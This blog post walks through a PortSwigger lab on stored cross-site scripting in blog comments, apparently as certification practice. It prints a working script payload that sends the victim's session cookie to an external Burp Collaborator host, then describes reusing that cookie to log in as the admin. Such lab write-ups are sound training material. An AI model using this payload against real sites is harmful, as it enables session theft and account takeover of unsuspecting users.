---
layout: post
title:  "Exploiting cross-site scripting to steal cookies"
date:   2024-09-29 09:39:54 +0530
categories: [BSCP, XSS]
---

## Initial Information

This lab contains a [stored XSS](https://portswigger.net/web-security/cross-site-scripting/stored) vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim's session cookie, then use this cookie to impersonate the victim.

  

## Things to Remember 

<p>
    To prevent the Academy platform from being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use <mark>Burp Collaborator’s default public server</mark>.
</p>
<p>
    Some users will notice that there is an alternative solution to this lab that does not require Burp Collaborator. However, it is far less subtle than <mark>exfiltrating the cookie</mark>.
</p>

  

## Solution

Kind of looks like a blog forum where we can comment on those blog posts by viewing the blog 

  

![]({{ site.baseurl }}/assets/images/image%2010.png)  

  

Sprayed the following payload `nithissh"><h2>XSS` on every field and to check whether any other fields are vulnerable other than, comment functionality it self.. But in our case, the blog comment field is vulnerable actually which we already know 

  

![]({{ site.baseurl }}/assets/images/image%2011.png)  

Now, we have confirmed that the vulnerability exists over there and in order to acheive our endgoal which is stealing the cookie value we need to curate a payload that it will steal the cookie and send it to our external server 

  

For that, we can use burp collaborator.. also there are other alternatives like interactsh or webhooks but portswigger enabled for all labs which needs OOB interaction we have to indefinitely use the burp collaborator

  

Coming to the payload part, Here is the sample payload where it utilizes the `<script>` tag 

  

```html
<script>
document.write('<img src="[URL]?c='+document.cookie+'" />');
</script>
```

  

Further moving ahead, replace the actual `[URL]`  with our burp collaborator ( `xyzy5c2elakzj8tsd599t5golfr6fw3l.oastify.com`  ) in an HTTP protocol and complete payload which we gonna utilize looks like as follows

  

```html
<script>
document.write('<img src="http://xyzy5c2elakzj8tsd599t5golfr6fw3l.oastify.com/?c='+document.cookie+'" />');
</script>
```

  

Now paste the payload into blog comment and look through the burp collab for any interaction related to cookie 

  

Looking and polling through, there is a interaction came in HTTP.. tied along with a cookie 

  

![]({{ site.baseurl }}/assets/images/image%2012.png)  

  

Now take the `session` value and replace with our session value eithier through burp repeater or through local storage we can do that and referesh the page, you will be logged in as a admin and the lab is solved 

  

![]({{ site.baseurl }}/assets/images/image%2013.png)  

  

## Do u Know why u got the admin token over there ?

Because every now and then, administrator over looks through the blog comments eithier some kind of bot is automating it or any other manual interaction which happened accidentally